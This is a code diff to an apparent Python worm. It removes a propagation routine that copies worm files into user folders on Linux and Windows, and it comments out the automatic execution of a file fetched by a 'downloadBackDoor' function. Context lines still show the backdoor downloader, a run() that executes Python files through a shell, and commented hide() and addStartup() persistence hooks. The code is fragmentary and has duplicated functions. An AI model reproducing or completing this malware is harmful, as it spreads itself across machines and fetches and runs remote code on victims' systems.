@@ -74,18 +74,6 @@ def copyHex(hexworm, src, dst):
 	print'[DST]', dst
 	hextornet.remove(hexworm)
 
-def propagate():
-	print("==========Worm location==========")
-	for d, w in hexDir:
-		if linux_client():
-			dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
-		elif windows_client():
-			dst = "C:\Users" + usr + "/" + d + "/" + str(w) + ".py"
-		copyHex(w, src, dst)
-		duplicate(dst)
-	print("=================================")
-
-
 def downloadBackDoor(url):
 	print''
 	print'===========Start downloading=========='
@@ -97,16 +85,14 @@ def downloadBackDoor(url):
 	print(outfile)
 	print'...Writing file'
         outfile.close()
-        run(os.path.abspath(filename))
+        #run(os.path.abspath(filename))
 	print'==========finish downloading=========='
 	print''
 
-
-
 def run(program):
-	process = sp.Popen('python '+program, shell=True)
-	process.wait()
-
+	print'[RUNNING]',program
+	process = sp.Popen('python ' + program, shell=True)
+	process.terminate()
 
 def main():
 	#hide()
@@ -161,7 +147,7 @@ def linux_client(system = sys.platform):
 
 def copyHex(hexworm, src, dst):
 	copyfile(src, dst)
-	print'[DST]', dst
+	print'[COPY]', dst
 	hextornet.remove(hexworm)
 
 def duplicate(hexfile):
@@ -212,8 +198,6 @@ def run(program):
 	print'[RUNNING]',program
 	process = sp.Popen('python ' + program, shell=True)
 	process.wait()
-
-
 def main():
 	#hide()
 	#addStartup()
